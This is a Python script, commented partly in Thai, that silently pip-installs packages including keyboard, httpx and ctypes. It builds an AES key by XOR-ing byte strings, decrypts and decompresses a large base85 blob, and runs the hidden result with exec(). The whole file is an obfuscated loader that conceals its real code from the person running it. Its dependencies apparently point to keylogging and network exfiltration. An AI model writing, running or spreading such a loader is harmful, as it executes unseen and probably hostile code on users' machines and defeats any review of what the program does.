
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['keyboard', 'rich', 'asyncio', 'subprocess', 'os', 'datetime', 'httpx', 'ctypes', 'ujson']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'\xe4P\xb8T\x14\xd2\x82\xd2\x94\x94\x02\x9b\x8e\x06\xdb#"c\xc147\xe8\xdd\xd7\xd5\xf3\x955K\x17\x87u', b'\xaa\xe7\x86\xf6\x96\x8dC\xae[v \xe9yX\x17=\x86\x82\xd8#z\xfb\xab\x1b\xb1d\xe4\xed_sWb', b'\x0fc\x0f\xbe\xe55h\xad\x0e\x1d\x03\xcf\xa1\x00\x9f\xa0\x18\x9f%>\x04\x86\x1c\x19\xa3\t`\x04\x04\x15\x99e'])
_I = _xor([b'\xc1\\\xa9*tQ\xd3\x9b\x93\xdc\x81\xa6\xe1h\xc9~', b'\xef\x8b\xc0n\xf2\xe7|\xfaYr\xfb\xfas\xab\xa6\xee'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

_enc = base64.b85decode('fNu@V-_clcHn^0_``+$75lA!;F>=}sMXq3U2(QdGtWaUU&FnhFy#ZIQSUJgb@imb}mbX=GN-GwEQh#>msDOdF5zrQF0InEAd|vy<f}vM6O}R;`V*KPI2XYVk%Fz(N6u0lg#~c+t<o5G?ACV9j&ZI+?pnWZdQGf_hu693j29=<cP?A|T`A8XAP_J>4V_Pb`U0`!9JhpZ^A)SY#zy&Pky-%U~<L&LpkBtkkKR1O{57uZjT_XX`iUKq}eWH)9Wnb98CmR_ty_m7^dM9-<#mj9t2|)>=r81ez<Uatu#;aei1V;3MdA<ois^4+Rl)v5S3cJ|GG;phL6;ylpRh-|lIbNNnX>UYo!28EcZuIm*Dp39P6Ul#20II2c|3}^!(M0J@?RNH9EQ`h_OoQn!lu32$I^>l8w~Y)l1H>Sxl%31bceo(MBF>uWlX;=t6%Rv%DM3vS?Lk&v?YzV$_+}tA@}I&?o!Z%lJ+Ca2galh0)jpD20`^5!g6T?mZ%_%I)W0F{By7mR;Lo_|;8R%4Q$YTK?{O&5^!+3O95?vn0@&E+>$!NoIT+N_11ZFpMQLlvTj+YoSsiHMUJ#9+;)OxxHV%ZWf^o?&x<KXTe$JZ@_k2?LkF4x>p}0?u?|5WaYkQcs#x=58=;#g`MkaZLNIKC^-X;qMRHfU1QXOh5w>`+pREu2)6|jcfy(f?e{@wRB^F36CfK1wZ6(HZTp$yk664V&mReTHKOQDHijz?de=CYOcsp^at%-4rP4r9|YZ}to@<IA%<{Rfz$M(W4-4!_aZ>0xtQZ+Y&q>nEOigR2TB6=xLSwnWtqGyC-~K}G>)T9!bNm}{v+TZYvd+QXN`^K9<=_SycN8F<hIsE)@0C)Ob)MX}LYzP#o9m@l27m5ts`=2i`$2DSYj+p-ncx{_0q=0;D1{9Q!OlGI|hnd?c2DWZC=1!HncVKPiSO#2x<S<!7Zyhyo8EMlwKd}+-#u*^5u-e?&&BSTJmyr?xhVi^9Dwacmzu@hb4U*#fOvOdhcAnH=P+VwqewR3e<eu;#U=<+`sAov+{Y1w+q{qMBVK{O8v5M85)+z~9q3aNOo;@I@KNQ)}hcYzOkfxWjC%ypM;e~3&adB`}lhQ3j6<Js_(qdJe69L$sbYk!WCVkN`eZdh*gvOAe1c>B)!5KpM3A?wvP>kRKx;~j|9nvm4D)55Q8o_+nKRpW<3eUJk0ES}04jd#6hCLI_d%3ObMYypxcikHZcujPF63euS`Q~VCD+{!3l@ZiopYG#UmY%Tbeev7sKhl1aszixS!+?ydTA*RE(EmlOBlkJ=?7ar}5^PRx(fN_LW<_Tb`vlL2=8Rd#_jy42!&hf8=MZk!wH=Eolf>yTkrH-D}xpa|P{B6<8mI;<hx77`L@I7pMh@eqJLj?uP-F9h4@5S7I(b_G;xbp8AcF>`IUA###gwTHR0HgUqA#ZQd<kei&mMF$RO2>|Bf4$rufuv#hhQ!rtiA#{+ioUz4cmtx^RhTg;&J0^<tu*&BO}bIJf}}r?Cf;z6p>EQ0kPpH91%6gRt{|<!M^_3%_h^PU=P>D@=}*`RMwBnNx~u|?<061B^N@?mL|F+~e@xlvg-cs!+&LL@aPU?2MBdst%(CvK_Y(54Pkrm%+j|!0lROrd`s?s{=Ge%$8RghQl3kPovU-yo27J;nuNTIRZ{>@|kw68%rzxPMDw7F|UOvs4tkNx{_n9>--eT<r5gJJx)rBgs;j6uva_82xhY%8po;ki+s>8aMv;day!jKNDJYji!i^xPb5*EbHa0@4{gYNRVX`Q1xI&=i`w>tNNNIG|!mBolQ34@WGzC%~Ih`+Bfk$nI>0H;K@Y`lf+!`%8rUWR=veDi@~`L=rtRZYNM;efa^A$e*m%!~I>^wJOjZ<>Jolrjp%eP6d!-`5`&`D2r--yZh#WVnW$=NXo!e*v!Rv`iOy?xAqn#WEOzxkEB}JCeetX$?_LLqBuBZADGZnwVWI_@~{$R9V~tEn$#<rEgCMLh9SislX1Oj~SCWZbH$n>>OHqYil*GI(}hoJZpgQhLuDY=J4VZvfv@1kmRCKINrS}a4|cytZ}(0??ayY#Z=k?7=2fgY)pqipVb4{I{-Ok72hxetj$+JSOZHutiVgf<*~9Qc=cPG=%iJIbz>ND6&F&Q(7`nGdjrOcBK!nea4JSo>A(SuGM@lRY`ogRz7e=k7*|+=9TlVn9*UCWRjqj0#&WH%I^`+``-9kXmo}vJ7eIP1NtU_4=5@hpI=z8tChf}dX4GV2_tn8~U7ztx<;1(ChGl+Ani7$FC4q`4;tIa!-H1m1m|U24-}+8C3tZLpGxOV*VdUBwRAf{aaVWer*yG!xtNB=uPDFfx6MRcLK*ZXbX)7wsSJqBZ)=LQr$L#4A@}?boh;S*_m0uJ!BybF<gpa4D7|`Qk{lb&evA2T23mhPgv*rUuSI<?;nEeev5TnuB)-VgYUvIDMz#*(qYL+2S$bRO58&1dKziyr8SIC4`3d|R?ff{j|x0OpyQWFwEjiXYP&AG3iyUoOr1T<p~jXM7JWOI*?;5BGmr%#dQNN&rbCkx-rxZu_&guW3U)>M|ZSVf@h9WSsZ$eqz^xz=(3W=_Xh24K7BGc{LP5JopQCOTb~8#0Un7K#$pK*n~v@3PP*QOZIdH?F4c1N4QVsN;jf&D%J{Sc2?M76P?G!3Z{6P9?vlVnHvHR6Xw-_i~Vh+#_)1!mw)Owl^?iRK1VbC}zGHllWe{ROz!3gsnFCeE$>Ij4gwKghtYsiUzkzpL@%r?E3bimu2@6rD<D#=xRE^d7Q$@?-mE)#brvbXtU#0*hUXa&mnth6X!cH37qdorXkw7)@;R=tR@<19LHlk3y5`WHp}AW*B(~Z^?14iYCh6rpBU&CpZdQ2#%1l)R33kearx}24VlZ@oOh)q5Krh}RrlFe^|l<6qp)2GR6iZYH!s0Bak;B9sOSqoK`)jZ?@L~1z70!C#vNoIu5{%Xq(>1?Vtq_%jGTUYJ-Eh}P%s?=iE6_w3wS7veUW-q&<T81NQE58%jW0cy~T&)Xq>iKU<i{YUeABxh#TS@6M#^dcNB{8v&N94oqn8XP0-BPK$8-n>e_&-Xw1|_9)}?`g2^SziIxM_`yS=y1aY?Y^xv>K#tSna;@zc=00V@bvSC15`ypb+`3)7+p}+V-kx&Ni#Q)@~s$qd-yUBc}>$jhN;R86K&4k5DXp?$*Z(HUo+;ZAIHhfpkW@@_?gC|0<8OHeuBLM%L3Irn!++Ggy?R&{gtTo2sTA_g`)~D5|qq0Jzp!6}0K_}aqHvL1T8j>v@1#m&>x%uP7;R=*}O0l|8gyYAV6t$e^75QCfD$(dn#z8|soy|*Q9Z+ls_l)c$oam%-#vwg<R?ciD6n=JRleIts<vf62<>$YvU|G#;9BxcJz#LI@t4V!*wkb^<PL)is>8J`@o{X40OdWnvi7Y-u1^U+eE`P61IRrSgw7GC(ZyQ>{iCU9W4jQt4<@n)q*Rk9zPH81YBMnjGXncSi41xGew%M@Cy*RUaj{zy(Lvu0_=6%=-y%xyzfmuvt?`Tpws&5!Ntl%I^cj(v7vS+Yr=&to2*Xx+c+E75B;X)R|2j33j!$fP$0$VT`FCkyK30vVe&Mu4nMko?4;y$OaO48UMl#6@3pIlXP{1!6Lqpb^BUHM0l%fZ??#m*|C0OpndSZVmL_YCu?6=q7$C=BV%!0V3VmnZ#mCN`!|>EjXbItne*{|(q7*>05*g$NmBnyItD#j&M-_LSDB!d^}xDve@c3;`r<?%F+%62J7X8MiuW)T^-ea9D^q+H{b_yU!=mtgTu21gmaw&dV=uXA4<fFYOT2wP1Fz5gN7U%HfI<&_a+V<3L9?PL15hJMZ9^r?ye{FvPZaHr2b$rl{PMGIeI%uODKvGkA4A(RAMc`2}L{AD5Sa8uKO)6iU_@KZdDWdGFxP{`!9o2RYrn4PrxpFTQcKFc*GGqX9QNqj#y&_Q}PGv?kl^RO_lq)7enKoP<i3|3SnmPG-4DmVc7f;PKcHdtsBFQ@{5rAWICtP}AsDKAy-@DD2|INznq*%o%*(%`}#cx(xy_wD`$2jZUvV$QnZiMtzd9ol*pdjj;NUCM3MGuIVmSQ!Ah;=2e8FPlEJ$hns{j6JiO{Z1=J(d+t*hrFP$S*@Rb{&!Ft0I(u=`DsFklN{jlE)ojDtmffLM#1Q7?{<BJoZ#;0OPG!vhmXfs<Oc|ATZ$i8#%neS~cxW6AUS4AXLPg2&YD)dtgV??(?YePF5rYGBWXNzmI=7okrNAnHHlf!>0AZgHkChUehRec(4&Z9+dD0Q%e&NQE?Wc$%Y&~(V%HtSV!JB=!psb@{Rut2YBzP<V_FTr57*q%m67^h`aLy=E0lYYVTIW<@QjOZmDEm>0;NZ8*$0WbC0K1-?G+}?;s(7s?@H1l>#t|xP=vwgTpk~*uAA)$$4}F$8H~;#EA3+nhA`KcJN*Xp?RC@G2%Qhi51KqPidpIYN&y-4%rIlf-;U}FVfX{Y1x{ZxIuG$KlwtXFaIndy{Dc+O|Qnb8z*z86Uqx#D&R+LzM13Z`jAQY*>V%<i<$UB~v5@49q+vLm@>O9y<VtBC?c{=G;h@Gqz-$Z62NM<7Qh+Mrz7_oH8w2f@73b+R-i_>tzlu%dG^zPoozgZr+(#?`3DqUNSi67)Fp~SuBwBXr4SbApXz=yH<y9h94t1=F36JiZN08rvcXDN9i7ZVWe>;`Dd@5zog#fC|Er4uua9bg=V^lHi&25q27uP=&gVvwTI;fsQnUF!i|;s<zA48amM#dsU>&|0NGstoJZC_ocFA?)b3Kv;a*t5-0Aw{Z>qwvWk1n#h4cAT59esFXj5v7-u#;ucu{aUFrU6Cm+1FyBZ2Eu+gPaZuJt=j!W-9-bqyFetE^V8)qLu8V?%FF<(a%jqGqSBYWU9d(C9+MMt@Q(}Gu=w-Kn2<OO?rUFew$WTXl=-z?orcjT8vu*avN%9i=7mWJ1rww}X<p9YBsW(qfM_Jeemd7>vL3Hljnb&RX$D+2-3#<WZ6v1SO-r8~750>}@26FP3vs$+GDrz>Jdh<9~60=Ir{0DZHcz6DA#y*}l%cmfd-n%a}cXpVL*r{ZKnEKc&yqdqp%G>R&|Jt3Q<m<58)$OpKKA_SRz96B@(c3gKBTb70%>B?CV2>Y+-d<+NzIp%ZN_ErKt>c60YaGqn?3lyvx8<r^9F&x<W#1_F0%b^f)5B(yY26CM9Sz;@{7)4Qh{F(}uE&BVxL3B259I^Lw{8$i(;yTKr~%rq%@PM(fKoIzRN?wf9kQHI1*h)RI1d=BfV^dkb%A;~n&2$tJE)eFyWZcdK$K;HpL5b#^SlcS4_DHdCdnMRL6G$LZqCW*P<LMf^i`e8dNZ`9Ol5MW131m-vmnYG7JskbkFW=&Ehod1s(W%b5BZG=U=4s{A*C<fW4$eX9_xm)P!UO{U?JT_J`sa`(hm1oxLswv%ZWEG(%FB17<FDow4cxsaPU{DR(<mog|U*eYJ}n^BGi<MD=^-{pkV&k1R{~mpeLD?8<O{^w>cKQ!8$+n^3Q;$1l})zlH$g+t<jkTNwJ@e^@b+N91MMP`&DzI{?yPU<XoiTmAf!Dh`1E3hJ>!QL<W)OyB{h3xVVbN!B}nC9g_WL1~ZR2Eq5y#5Mxy0{}?999kw-G8bhg}>wATt%;9Gm(9SQbbv<Bx`z`0;@+1+NrYs(1p>=eVCQu=>2XF?+2S%8;PJrWGV9U<gcbQBzkix(_>rb5k(U%ZIZkyAl;r@K%Gcy7Dq|Gzg`2LY7^&_Wi7v)}I3R0+!{3gELgIk~JjFhd95a=fr5Xn2_LTHHV_7#A$epEKTCI(U)I-$L>)BqJ>wtXja?{OwTcPjC6UNo%1wV9#!H_&S2lM4|{LM^A^Pp*At+e#t9K95XiIseK?d)4fxr(3tDmlrEM+@3C593d}440}=g2hDOccY6T*HaqW$D0DnPqKC8!xTaf>z$tA*fV5Yz-7>Csdfsb|;4GSsf#ZM(*m&@T3^W^mI>HxY=+@bXr?!_00;7Kz%XX56PLI5!vC0`jEvW|QOBf#n+WD3tI+U6Bduh7(R=r&amEOQiV4r55WLur|juENq#=iO=25Caol!_9Z*#O>;-kFk!3H&{eJOn#<iC6_!LU;bQ`Je2*-sOkxV1)h42gcCQ!!&1a>ML#x8a-OTynwl{i<j4fTz0o_6Yl*E|1hOV<;O0pdt#UF@0-u{6g6J!%O<F!Jleqex_S8Pm9IY_2eM?WPy~mO$QQnL7}Gd<&1SSa7V%z23q-YA(5uC0gKxzz;O-ru-N-_Dn_|Yc^8;s!CysNa|2fk71B$m9HV(9$DySZpfi^Wy+vTKYK2zJ{+wX3zMMM-DUjL7-oZHf>h+wdLG?NYVg(yu2uy_tzgifrIO-v3i)iV9AX!bh*=>m1x1sU>ygM(?*=<9CTwuz&t&+iiB9P0k?R<y7|uN5+_Z;8Lj-?!_GJ$)-tUyV9a+o3Wd<QP2KZm~4cQmuWrT(;^z9+RuaDUk@pXuABUHI)cm)uh{skS#f}0lucEL&oSUX@Cj_7p4<4qp4C>uvv7_^gi=Leg=|-Xbo$CLiXI{rT!gskRS_6z>^G9#;gNw&gbd~+%a=jx38H!fyxtfnX0;7y8@CrO`FphedRV`X-?PXL8fU_Bw}l1+sA8ed8`_!NBVhe7<-pi=0D?LLfXjp-XSd(QJ?p!8+lErQGLpEOapL8WBMLPtN4Rz+#Sc+>QOq^5Xqegx)qLjVV(Xe32|%oz+CETePQJK@q|j9w76_`;F9WIhJzu;KwT_OvKm2u`YudV2biL`H-iZ#5Y%2|j#w0W5m8ihY0{31QJ!VUi6*^+$aeq~|C<vNj6;6D7N-}P+pgUW{`#2KUwP`Q@l!w5F}t2|*=pGChT}&mfsEcq4q=5yx9Wic_EZpIEXWo(JnW<QYR1{Zv{KK4>W--Gskv1ZU@uw;!<5$v^;p$u{p9-m<hK!SJja*0^_R+mXebi<2->*Fnf^khbhK66qnQUu<lA`Vq${38!Vx{^xu0*&MH)9J*vq2oIo&pBZ_I#{%`(^5C~ewW*Q7gG$N0ouew>a%;2)|HEp&e<$<20|DgXN1h2y0b&SOpU2Fs<O)LXo@3BQxz>&tY{xEp9Qh!BOwkL*t4nrrBAOec!SX44u6')
_raw = unpad(AES.new(_K, AES.MODE_CBC, _I).decrypt(_enc), 16)

# EXECUTE UNIVERSAL CODE
exec(zlib.decompress(_raw).decode('utf-8'), {
    "__name__": "__main__",
    "__builtins__": __builtins__,
    "_decrypt_str": _decrypt_str,
    "_decrypt_bytes": _decrypt_bytes,
})
